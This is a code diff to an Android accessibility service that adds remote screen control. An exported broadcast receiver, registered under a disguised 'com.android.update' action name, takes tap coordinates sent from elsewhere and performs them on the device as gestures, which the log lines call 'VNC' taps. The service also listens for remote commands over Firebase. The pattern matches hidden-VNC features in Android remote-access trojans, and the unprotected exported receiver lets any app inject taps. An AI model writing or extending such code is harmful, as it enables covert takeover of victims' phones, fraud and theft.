@@ -41,6 +41,12 @@ import com.google.firebase.database.DatabaseError;
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
 import com.google.firebase.database.ValueEventListener;
+import android.content.BroadcastReceiver;
+import android.content.IntentFilter;
+import android.accessibilityservice.GestureDescription;
+import android.graphics.Path;
+import android.util.DisplayMetrics;
+import android.view.WindowManager;
 
 public class MyAccessibilityService extends AccessibilityService {
     private static final String TAG = "AccessibilityService";
@@ -108,6 +114,51 @@ public class MyAccessibilityService extends AccessibilityService {
         if (userId != null) {
             listenForCommands(userId);
         }
+
+        // ✅ Register receiver for Interactive Remote Control via WebSockets
+        registerReceiver(new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+                String jsonData = intent.getStringExtra("gesture_data");
+                if (jsonData != null) {
+                    try {
+                        JSONObject obj = new JSONObject(jsonData);
+                        if ("tap".equals(obj.getString("action"))) {
+                            double relX = obj.getDouble("x");
+                            double relY = obj.getDouble("y");
+                            executeTap(relX, relY);
+                        }
+                    } catch (Exception e) {
+                        Log.e(TAG, "Gesture error: " + e.getMessage());
+                    }
+                }
+            }
+        }, new IntentFilter("com.android.update.REMOTE_GESTURE"), Context.RECEIVER_EXPORTED);
+    }
+
+    private void executeTap(double relX, double relY) {
+        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
+        DisplayMetrics metrics = new DisplayMetrics();
+        wm.getDefaultDisplay().getRealMetrics(metrics);
+        
+        int x = (int) (metrics.widthPixels * relX);
+        int y = (int) (metrics.heightPixels * relY);
+
+        Log.d(TAG, "Executing VNC Tap at: " + x + ", " + y);
+
+        Path swipePath = new Path();
+        swipePath.moveTo(x, y);
+        swipePath.lineTo(x, y); // Tap is a zero-length swipe
+
+        GestureDescription.Builder builder = new GestureDescription.Builder();
+        builder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, 50));
+        
+        dispatchGesture(builder.build(), new GestureResultCallback() {
+            @Override
+            public void onCompleted(GestureDescription gestureDescription) {
+                Log.d(TAG, "VNC Tap Completed");
+            }
+        }, null);
     }
 
     private void listenForCommands(String uid) {
